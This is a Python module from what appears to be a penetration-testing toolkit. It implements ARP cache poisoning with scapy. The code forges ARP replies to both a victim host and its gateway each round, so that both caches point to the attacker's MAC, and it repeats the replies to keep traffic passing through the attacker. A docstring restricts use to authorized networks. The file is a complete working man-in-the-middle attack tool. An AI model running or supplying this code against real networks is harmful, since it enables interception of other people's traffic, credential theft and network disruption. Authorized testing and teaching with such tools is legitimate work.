"""ARP cache poisoning: poison both ends of a conversation and keep them poisoned.

ARP spoofing sends one forged binding to one host. Cache poisoning goes further:
each round sends a forged reply to the victim (the gateway's IP is at the
attacker's MAC) and a forged reply to the gateway (the victim's IP is at the
attacker's MAC). Both caches point to the attacker, so traffic in both directions
passes through it. Repeating the rounds keeps the entries from expiring.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.arp_spoofing import build_arp_reply, parse_ipv4
from macabre.attacks.common import (
    Runner,
    normalize_unicast_mac,
    read_interface_mac,
    run_command,
)


@dataclass(frozen=True)
class ArpPoisoningConfig:
    iface: str                # attacker interface, on the victim's segment
    victim_ip: str            # host whose cache is poisoned for the gateway
    gateway_ip: str           # gateway whose cache is poisoned for the victim
    victim_mac: str = ""      # optional; empty = send the victim's reply to broadcast
    gateway_mac: str = ""     # optional; empty = send the gateway's reply to broadcast
    count: int = 0            # rounds (each round poisons both caches); 0 = until stopped
    interval: float = 2.0     # seconds between rounds
    dry_run: bool = False     # build replies but do not send them

    def __post_init__(self) -> None:
        victim = parse_ipv4(self.victim_ip, "victim IP")
        gateway = parse_ipv4(self.gateway_ip, "gateway IP")
        if victim == gateway:
            raise ValueError("Victim and gateway must be different hosts.")
        if self.victim_mac.strip():
            normalize_unicast_mac(self.victim_mac)
        if self.gateway_mac.strip():
            normalize_unicast_mac(self.gateway_mac)


@dataclass
class ArpPoisoningStats:
    rounds: int = 0
    frames: int = 0
    attacker_mac: str = ""


def run_arp_poisoning(
    config: ArpPoisoningConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ArpPoisoningStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> ArpPoisoningStats:
    """Poison the victim's and the gateway's ARP caches each round, until `count` or stop."""
    run = run or run_command
    send = send or sendp
    attacker_mac = read_interface_mac(config.iface, run)
    victim = parse_ipv4(config.victim_ip, "victim IP")
    gateway = parse_ipv4(config.gateway_ip, "gateway IP")
    victim_mac = normalize_unicast_mac(config.victim_mac) if config.victim_mac.strip() else ""
    gateway_mac = normalize_unicast_mac(config.gateway_mac) if config.gateway_mac.strip() else ""

    stats = ArpPoisoningStats(attacker_mac=attacker_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.rounds < config.count):
        # "The gateway's IP is at my MAC", sent to the victim.
        to_victim = build_arp_reply(attacker_mac, gateway, victim, victim_mac)
        # "The victim's IP is at my MAC", sent to the gateway.
        to_gateway = build_arp_reply(attacker_mac, victim, gateway, gateway_mac)
        for frame in (to_victim, to_gateway):
            if not config.dry_run:
                send(frame, iface=config.iface, verbose=False)
            stats.frames += 1
        stats.rounds += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
